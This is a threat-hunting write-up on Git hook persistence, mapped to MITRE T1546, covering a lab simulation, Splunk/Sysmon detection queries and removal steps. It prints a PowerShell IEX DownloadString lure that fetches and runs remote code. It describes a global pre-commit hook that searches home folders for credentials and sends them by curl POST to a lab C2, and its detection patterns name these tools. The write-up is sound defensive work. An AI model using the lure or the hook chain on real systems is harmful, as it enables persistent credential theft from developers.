# H003 - Git Hook Global Persistence

## Hypothesis

An attacker who has gained code execution on a developer's machine may plant a malicious pre-commit hook and configure Git globally to use it, causing the hook to execute silently every time the developer commits code across any of their repositories.

This technique involves three key actions:

- Creating a centrally hosted hooks directory outside of any individual repository
- Writing a malicious pre-commit script to that directory
- Modifying the global Git configuration to redirect all repositories to use the attacker-controlled hooks path via `core.hooksPath`


## MITRE ATT&CK Mapping

| Technique ID | Technique |
|---|---|
| T1546 | Event Triggered Execution |

This hunt maps to MITRE ATT&CK `T1546` because the pre-commit hook executes automatically in response to a Git event (a commit), making it a form of event-triggered execution used for persistence.

- https://attack.mitre.org/techniques/T1546/

> **Note:** There is currently no dedicated sub-technique in ATT&CK for Git hook abuse, and no Atomic Red Team test exists for this technique. This represents a gap in publicly available detection coverage, which makes it a worthwhile hunt to document.


## Test Method

### Lab Environment

| Machine | OS | IP | Role |
|---|---|---|---|
| Kali Linux | Kali Linux | 192.168.37.132 | Attacker |
| Victim | Windows 11 | 192.168.37.130 | Victim (Git + Sysmon) |
| Splunk | - | - | SIEM |

### Attack Simulation

The attack was simulated manually as no Atomic Red Team test exists for this technique.

**Step 1 — Attacker setup**

A malicious PowerShell script (`setup.ps1`) was hosted on a GitHub Gist. This script:
- Creates `C:\ProgramData\.git-hooks\` as a centrally hosted hooks directory
- Writes a malicious `pre-commit` hook file to that directory
- Sets `core.hooksPath` in the victim's global Git config to point to the attacker-controlled directory

A fake C2 listener was started on Kali to receive exfiltrated data:

```bash
python3 c2.py
```

**Step 2 — Social engineering delivery**

The victim was social engineered into running the following PowerShell one-liner, disguised as a developer audit script:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/...')
```

The script ran entirely in memory (fileless delivery). The victim saw only:

```
Assessment complete.
```

![IEX lure executed](screenshots/01-iex-lure-powershell.png)

**Step 3 — Hook triggered**

A Git commit was made in the victim's development project. The pre-commit hook fired silently before the commit completed:

```powershell
cd C:\Users\Adam\projects\webapp
echo "update" >> app.js
git add .
git commit -m "add new feature"
```

The hook scanned the victim's Desktop, Documents, and Downloads for files containing credential-related keywords, and exfiltrated the findings to the attacker's C2.

![C2 data received](screenshots/02-c2-data-received.png)


## Hunting for Git Hook Persistence with Sysmon

### Event ID 4104 — PowerShell Script Block (Initial Delivery)

Using the same approach from [H001 - Suspicious PowerShell Execution](https://github.com/ADZYYYY/H001-Suspicious-PowerShell-Execution), PowerShell Event ID 4104 captures the script block content processed by the PowerShell engine, even when the script runs in memory via IEX.

```spl
index=powershell earliest=-60m
| rex "<EventID>(?<EventCode>\d+)</EventID>"
| rex "<Data Name='ScriptBlockText'>(?<ScriptBlockText>.*?)</Data>"
| search EventCode=4104
| search ScriptBlockText="*DownloadString*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*" OR ScriptBlockText="*core.hooksPath*" OR ScriptBlockText="*git-hooks*"
| table _time host EventCode ScriptBlockText
| sort _time
```

- `EventCode=4104` captures PowerShell script block logging events
- `DownloadString` and `IEX` are the key indicators of fileless in-memory delivery
- `core.hooksPath` and `git-hooks` will catch the hook planting commands if they appear in the script block
- `sort _time` orders events chronologically to follow the delivery chain

**Results**

![Splunk Event 4104](screenshots/03-splunk-event-4104.png)

- The script block captured by Event ID 4104 showed the full content of the malicious PowerShell script executing in memory, including the creation of the `.git-hooks` directory and the `git config --global core.hooksPath` command
- This is the loudest point of the attack — fileless delivery still gets logged here because PowerShell script block logging captures what the engine executes, regardless of how it was delivered
- Another win for PowerShell script block logging :D


### Event ID 11 — File Creation (Hook Planted and gitconfig Modified)

After the script ran in memory, two key files were written to disk. Sysmon Event ID 11 captures file creation and modification events.

```spl
index=sysmon EventCode=11 earliest=-60m
| search TargetFilename="*pre-commit*" OR TargetFilename="*.gitconfig*" OR TargetFilename="*git-hooks*"
| table _time host User TargetFilename Image ProcessId
| rename Image as "Process", TargetFilename as "File Created / Modified"
| sort _time
```

- `EventCode=11` filters for file creation events
- `pre-commit` identifies the malicious hook file being written to disk
- `.gitconfig` identifies the global Git configuration being modified
- `git-hooks` catches the directory creation and any files written inside it

**Results**

![Splunk Event 11](screenshots/04-splunk-event-11.png)

Two key events were observed:

**pre-commit file created**
```
C:\ProgramData\.git-hooks\pre-commit
```
- The pre-commit hook was written to `C:\ProgramData\.git-hooks\` — a location completely outside any individual Git repository
- Legitimate Git hooks live inside `.git\hooks\` within a specific project. A pre-commit file appearing in `ProgramData` is highly suspicious and has no legitimate developer use case

**gitconfig modified**
```
C:\Users\Adam\AppData\Local\Programs\Git\etc\gitconfig
```
- This is the system-level Git config for Git for Windows installed in the user's AppData — it applies to all of the user's Git operations
- The modification was confirmed via the lock-file-to-rename pattern in the USN journal: `.gitconfig.lock` created → data added → renamed to `.gitconfig`, which is Git's atomic write behaviour


### Event ID 1 — Process Creation (Hook Execution Chain)

When the developer ran `git commit`, the pre-commit hook fired. Sysmon Event ID 1 captures the full process chain, showing `git.exe` spawning `sh.exe`, which then spawned `grep.exe` and `curl.exe`.

```spl
index=sysmon EventCode=1 earliest=-60m
| search (ParentImage="*git.exe" AND Image="*sh.exe") 
    OR (ParentImage="*sh.exe" AND (Image="*grep.exe" OR Image="*find.exe" OR Image="*curl.exe"))
| table _time host User ParentImage Image CommandLine ProcessId ParentProcessId
| rename ParentImage as "Parent Process", Image as "Process", CommandLine as "Command Line"
| sort _time
```

- `ParentImage="*git.exe" AND Image="*sh.exe"` identifies `git.exe` spawning the shell — this alone is not suspicious, but what `sh.exe` does next is
- `ParentImage="*sh.exe"` with `grep.exe`, `find.exe`, or `curl.exe` as children is the red flag — a shell spawned by Git has no legitimate reason to be scanning files or making outbound connections
- All of these binaries (`sh.exe`, `grep.exe`, `find.exe`, `curl.exe`) are bundled with Git for Windows at `C:\Program Files\Git\usr\bin\`

**Results**

![Splunk Event 1](screenshots/05-splunk-event-1-process-chain.png)

The full process chain observed was:

```
git.exe
  └── sh.exe         (executes the pre-commit hook)
        ├── grep.exe (scans files for credential keywords)
        ├── find.exe (searches for .env files)
        └── curl.exe (exfiltrates data via HTTP POST)
```

- `git.exe → sh.exe` is normal Git behaviour and would not alert on its own
- `sh.exe → grep.exe` scanning `Desktop`, `Documents`, and `Downloads` is not normal — no legitimate pre-commit hook would need to search a user's home directories
- `sh.exe → curl.exe` making an outbound `POST` request to a non-developer IP is the strongest signal of exfiltration


### Event ID 3 — Network Connection (Data Exfiltration)

Sysmon Event ID 3 captures outbound network connections. The key signal here is `curl.exe` making a `POST` request with `sh.exe` as the parent process.

```spl
index=sysmon EventCode=3 earliest=-60m
| search (Image="*curl.exe" OR Image="*sh.exe") 
| search ParentImage="*sh.exe" OR ParentImage="*git.exe"
| table _time host User Image ParentImage DestinationIp DestinationPort SourceIp Protocol
| rename Image as "Process", ParentImage as "Parent Process", DestinationIp as "Destination IP", DestinationPort as "Destination Port"
| sort _time
```

- `Image="*curl.exe"` identifies the process making the outbound connection
- `ParentImage="*sh.exe"` confirms it was spawned by the hook shell, not by a user directly
- `DestinationIp` and `DestinationPort` show where the data was sent — in this test, `192.168.37.132:8080`

**Results**

![Splunk Event 3](screenshots/06-splunk-event-3-network.png)

- `curl.exe` was observed making an outbound HTTP POST to `192.168.37.132:8080`, with `sh.exe` as the parent process and `git.exe` as the grandparent
- In a real attack, this destination would be an internet-facing C2 server, potentially hosted on a trusted platform such as a cloud provider or a legitimate-looking domain to blend into normal developer traffic


## Findings

PowerShell Event ID 4104 was the earliest and loudest detection point, capturing the full IEX delivery script in memory before anything was written to disk. This is consistent with findings from H001.

Sysmon Event ID 11 confirmed the persistence mechanism by showing the pre-commit hook being written to `C:\ProgramData\.git-hooks\` and the global gitconfig being modified — both are strong indicators because neither has a legitimate use in normal developer workflows.

Sysmon Event ID 1 revealed the full execution chain when the hook fired, showing `git.exe → sh.exe → grep.exe → curl.exe`. The file scanning and outbound connection activity from a shell spawned by Git is anomalous and would not occur during normal developer activity.

Sysmon Event ID 3 confirmed data exfiltration via an outbound HTTP POST from `curl.exe` parented to `sh.exe` and `git.exe`.

For this hunt, PowerShell Event ID `4104` caught the delivery, Sysmon Event ID `11` caught the persistence being established, Sysmon Event ID `1` caught the hook executing and scanning for credentials, and Sysmon Event ID `3` caught the exfiltration. Together they provide full coverage across the attack chain.

> **Key observation:** Windows Defender did not flag this activity. The technique relies entirely on legitimate binaries — `git.exe`, `sh.exe`, `grep.exe`, `curl.exe` — with no malicious executables dropped. Detection depends on behavioural monitoring via Sysmon, not signature-based AV.


## Removal

To remove the Git hook persistence:

```powershell
# Remove the global hooks path setting
git config --global --unset core.hooksPath

# Remove the hooks directory and pre-commit file
Remove-Item "C:\ProgramData\.git-hooks" -Recurse -Force

# Verify removal
git config --global --list | findstr hook
# Should return nothing
```

To verify the gitconfig is clean, review the file directly:

```powershell
cat "C:\Users\$env:USERNAME\AppData\Local\Programs\Git\etc\gitconfig"
```

Confirm there is no `hooksPath` entry under `[core]`.


## Building Real Detections Around This

Alert when a `pre-commit` file is created outside of a `.git\hooks\` directory, or when `core.hooksPath` is modified in any gitconfig file. Increase severity when `sh.exe` or `curl.exe` spawned by `git.exe` makes outbound network connections.

```spl
index=sysmon earliest=-60m
| eval detection_type=case(
    EventCode=11 AND match(TargetFilename,"(?i)pre-commit") AND NOT match(TargetFilename,"(?i)\\.git\\\\hooks"), "Suspicious pre-commit location",
    EventCode=11 AND match(TargetFilename,"(?i)\\.gitconfig"), "gitconfig modified",
    EventCode=1 AND match(ParentImage,"(?i)sh\\.exe") AND match(Image,"(?i)(grep|find|curl|wget)\\.exe"), "Suspicious child of sh.exe",
    EventCode=3 AND match(Image,"(?i)curl\\.exe") AND match(ParentImage,"(?i)sh\\.exe"), "curl outbound via sh.exe",
    true(), null()
)
| where isnotnull(detection_type)
| eval severity=case(
    detection_type="curl outbound via sh.exe", "High",
    detection_type="Suspicious child of sh.exe", "High",
    detection_type="Suspicious pre-commit location", "Medium",
    detection_type="gitconfig modified", "Medium",
    true(), "Low"
)
| table _time host User EventCode detection_type severity TargetFilename Image ParentImage DestinationIp CommandLine
| rename TargetFilename as "File", Image as "Process", ParentImage as "Parent Process", DestinationIp as "Destination IP", CommandLine as "Command Line"
| sort - severity _time
```

This query correlates across four Sysmon event types to cover the full attack chain. It evaluates each event against known indicators of Git hook abuse and assigns severity based on how close the activity is to confirmed exfiltration. A `pre-commit` file outside of a `.git\hooks\` path or a gitconfig modification are medium severity on their own. A shell spawned by Git making network connections or running file scanning tools is high severity.

**Key parts broken down:**

- `match(TargetFilename,"(?i)pre-commit") AND NOT match(TargetFilename,"(?i)\\.git\\\\hooks")` flags pre-commit files written anywhere except inside a legitimate `.git\hooks\` directory
- `match(TargetFilename,"(?i)\\.gitconfig")` flags any modification to a gitconfig file
- `match(ParentImage,"(?i)sh\\.exe") AND match(Image,"(?i)(grep|find|curl|wget)\\.exe")` catches file scanning or network tools spawned by the Git shell
- `severity` scoring prioritises outbound network activity and suspicious process chains as high, and persistence file drops as medium
- This can be paired with a lookup table to suppress known CI/CD tooling or developer automation that legitimately uses hooks
